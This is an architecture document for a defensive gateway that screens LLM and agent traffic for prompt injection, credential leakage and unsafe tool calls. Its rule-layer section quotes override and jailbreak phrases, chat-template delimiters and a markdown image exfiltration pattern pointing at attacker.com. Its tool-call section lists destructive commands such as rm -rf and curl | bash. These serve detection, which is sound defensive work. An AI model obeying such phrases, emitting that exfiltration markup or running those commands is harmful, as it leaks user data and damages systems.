# Project AEGIS — System Architecture

## 1. Executive Overview

**Project AEGIS** is a local-first security gateway that operates as an intelligent firewall between client applications, autonomous AI web agents, and Large Language Models (LLMs). It prevents direct and indirect prompt injection, sensitive data and credential leakage, and unsafe tool execution by enforcing deterministic rules, text normalization, trust-aware context analysis, and machine-learning classification.

```text
┌────────────────────────────┐        ┌─────────────────────────────────────────────┐
│ Client apps / agents       │        │ AEGIS Gateway (FastAPI)                      │
│  - Attack Lab agent app    │  HTTP  │                                              │
│  - OpenAI-compatible client├───────►│  /v1/chat/completions  (OpenAI-compatible)   │
│  - Chrome extension        │        │  /v1/scan              (Scan text payloads)  │
│  - In-app SDK / aegis-shield│       │  /v1/scan/tool-call    (Tool action check)   │
└────────────────────────────┘        │  /v1/policies, /v1/events, /v1/metrics ...   │
                                      │                                              │
                                      │  Pipeline (ordered, returns LayerResult):    │
                                      │   1 Normalizer / Deobfuscator                │
                                      │   2 Rule layer (delimiters, exfil, secrets)  │
                                      │   3 ML classifier (ONNX Runtime, trained)    │
                                      │   4 Context layer (trust-aware, RAG chunks)  │
                                      │   5 Tool-call policy engine                  │
                                      │   6 Decision engine (verdict: allow|warn|block)│
                                      │                                              │
                                      │  Upstream: Ollama / OpenAI-compatible LLM    │
                                      │  Storage: SQLite (default) / Postgres        │
                                      └──────────────────────┬──────────────────────┘
                                                             │
                                      ┌──────────────────────▼──────────────────────┐
                                      │ Dashboard (React 18 + TS + Vite + Tailwind)  │
                                      │  Overview · Attack Studio · Docs & Reasoning │
                                      │  Threat Feed · Policies · Evaluation · Audit │
                                      └──────────────────────────────────────────────┘
```

---

## 2. Multi-Layer Pipeline (`backend/app/core/pipeline.py`)

Every payload entering the gateway passes sequentially through the inspection layers. Each layer executes independently and returns a `LayerResult` containing a normalized risk score ($0.0 \le score \le 1.0$), a descriptive label, execution latency, and character-level `Evidence` spans for forensic UI highlighting.

### Layer 1: Normalizer / Deobfuscator (`backend/app/layers/normalizer.py`)
- **Unicode NFKC Normalization**: Resolves homoglyphs and mixed-script lookalikes.
- **Zero-Width & Invisible Characters**: Detects and strips steganographic markers (`U+200B` to `U+200D`, `U+FEFF`, directional overrides `U+202A` to `U+202E`).
- **Unicode Tag Decoding**: Translates covert tags (`U+E0000` to `U+E007F`) into printable ASCII.
- **Multi-Scheme Unwrapping**: Identifies and decodes Base64, Hexadecimal, and URL percent-encoded payloads with span tracking.

### Layer 2: Deterministic Rule Layer (`backend/app/layers/rules.py`)
Deterministic regex signatures executing in $< 0.1\text{ ms}$:
* `R-DELIM-001` (Chat Template Delimiters): Detects `<|im_start|>`, `<|im_end|>`, `[INST]`, `[/INST]`, `<<SYS>>`, `<s>[SYSTEM]`, `Human:... Assistant:...`.
* `R-EXFIL-001` (Covert Image Exfiltration): Detects untrusted markdown `![...](https://attacker.com/leak?cookie=...)` and `<img src="...token=...">` tags.
* `R-JAIL-001` (Roleplay Jailbreaks): Flags persona hijacking ("you are now DAN", "Developer Mode", "ignore safety policies").
* `R-OVERRIDE-001` (Instruction Overrides): Catches commands commanding the model to disregard prior instructions ("ignore all previous instructions", "system override:").
* `R-SECRET-001` (Credential Patterns): Detects high-entropy OpenAI keys (`sk-...`), Anthropic keys (`sk-ant-...`), AWS Access IDs (`AKIA...`), RSA private keys, and JWT headers.

### Layer 3: ML Classifier (`backend/app/layers/classifier.py`)
- Evaluates semantic representations against trained prompt-injection models.
- **Phase 1 Baseline**: Scikit-Learn TF-IDF vector prober (`legacy_tfidf.py`).
- **Phase 2 Target**: Quantized ONNX INT8 transformer (`microsoft/deberta-v3-small` or `all-MiniLM-L6-v2`) executing locally on CPU via ONNX Runtime ($< 15\text{ ms}$ latency).

### Layer 4: Context & Trust-Aware Scrutiny (`backend/app/layers/context.py`)
Enforces the **First-Class Trust Level Concept**:
- `system`: Trusted developer instruction context (multiplier: $0.2$).
- `user`: Interactive direct prompt (multiplier: $1.0$).
- `retrieved`: External RAG documents, ingested PDFs, scraped HTML (multiplier: $1.35$).
- `tool_output`: Returned payloads from external tools and plugins (multiplier: $1.45$).
*Imperative commands found inside `retrieved` chunks or `tool_output` constitute **indirect prompt injection** and receive an immediate high-risk penalty.*

### Layer 5: Tool-Call Policy Engine (`backend/app/layers/toolcall.py`)
- Inspects proposed agent tool calls prior to execution.
- Intercepts dangerous system commands (`rm -rf`, `mkfs`, `curl | bash`, SQL drops) and forbids unauthorized tool invocation (`system_shutdown`, `format_disk`).

### Layer 6: Decision Engine (`backend/app/core/decision.py`)
- Compiles findings across all layers factoring in source trust multipliers.
- Emits one of four deterministic actions:
  - `allow`: Payload verified clean; forwarded upstream.
  - `warn`: Elevated suspicion score ($0.40 \le score < 0.70$); flagged for monitoring.
  - `block`: Violation detected or score exceeds block threshold ($score \ge 0.70$).
  - `redact`: Sensitive data or canary tokens scrubbed and replaced.

---

## 3. Core Data Schemas (`backend/app/core/models.py`)

```python
class Evidence(BaseModel):
    kind: str  # e.g., "rule_match_R-DELIM-001", "base64_payload"
    span: tuple[int, int] | None  # (start_char, end_char) within analyzed text
    detail: str  # Human-readable explanation


class LayerResult(BaseModel):
    layer: str  # Layer name
    score: float  # Normalized risk [0.0, 1.0]
    label: str  # Diagnostic label
    evidence: list[Evidence]  # Flagged evidence fragments
    latency_ms: float  # Layer execution duration


class ScanRequest(BaseModel):
    text: str  # Untrusted input
    source: Literal["system", "user", "retrieved", "tool_output"]
    system_prompt: str | None = None
    metadata: dict[str, Any] = {}


class ScanResponse(BaseModel):
    verdict: Literal["allow", "warn", "block", "redact"]
    risk_score: float
    layers: list[LayerResult]
    request_id: str
    policy_id: str
    latency_ms: float
    sanitized_text: str | None = None
```

---

## 4. Hardware Budget & Resource Allocation

* **Target Hardware:** 16 GB RAM, RTX 4050 6 GB VRAM, Windows 11 / Linux.
* **Inference Runtime:** Entirely CPU-compatible (ONNX Runtime, Scikit-learn, Regex). VRAM consumption during inference is **0 MB**.
* **Training Budget (Phase 2):** Fine-tuning runs in FP16 with gradient accumulation on small models (`deberta-v3-small`), fitting comfortably under **4.5 GB VRAM**.
